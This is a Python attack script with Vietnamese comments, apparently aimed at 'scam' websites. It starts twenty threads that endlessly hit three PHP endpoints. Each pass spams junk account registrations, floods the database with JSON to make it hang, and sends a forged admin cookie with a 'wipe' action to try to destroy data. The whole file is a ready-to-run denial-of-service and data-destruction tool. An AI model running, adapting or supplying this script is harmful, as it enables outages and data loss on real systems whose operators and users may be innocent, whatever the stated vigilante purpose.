import requests
import threading
import time
import random
import sys
from colorama import Fore, init

init(autoreset=True)

class WerewolfUltimate:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.headers = {"User-Agent": "Mozilla/5.0 (Android 10; Mobile; rv:100.0)"}
        # Tọa độ các "tử huyệt" từ video và savehack.txt
        self.endpoints = [
            "/assets/ajax/login.php",
            "/assets/ajax/data.php",
            "/assets/ajax/buy_premium.php"
        ]

    def attack_logic(self):
        while True:
            for path in self.endpoints:
                url = self.target + path
                try:
                    # PHƯƠNG ÁN 1: Spam tài khoản rác
                    requests.post(url, data={"u": "W_wolf"+str(random.randint(1,999)), "p": "P@ss"+str(random.randint(1,999))}, timeout=2)
                    
                    # PHƯƠNG ÁN 2: Đầu độc JSON (Làm treo DB)
                    requests.post(url, json={"id": random.random(), "msg": "clean_by_werewolf"}, timeout=2)
                    
                    # PHƯƠNG ÁN 3: Thử quyền Admin & Hủy diệt
                    requests.post(url, cookies={"admin_login": "true"}, data={"action": "wipe"}, timeout=2)
                except:
                    pass
            
            # MẸO CỰC QUAN TRỌNG: Nghỉ 0.1s để điện thoại KHÔNG BỊ CỨNG ĐỜ
            time.sleep(0.1)

    def start(self):
        print(f"{Fore.CYAN}== WEREWOLF ULTIMATE: 3 PHƯƠNG ÁN ĐANG KÍCH HOẠT ==")
        print(f"{Fore.YELLOW}[*] Đang oanh tạc mục tiêu: {self.target}")
        
        # Tạo 20 luồng tấn công song song (Vừa đủ mạnh, vừa mát máy)
        for i in range(20):
            t = threading.Thread(target=self.attack_logic)
            t.daemon = True
            t.start()
            
        try:
            while True:
                sys.stdout.write(f"\r{Fore.GREEN}[WEREWOLF] Đang bắn tổng lực... Máy: Mượt | CPU: Ổn định")
                sys.stdout.flush()
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Dừng tấn công.")

if __name__ == "__main__":
    target_link = sys.argv[1] if len(sys.argv) > 1 else input("Nhập link web lừa đảo: ")
    bot = WerewolfUltimate(target_link)
    bot.start()
    
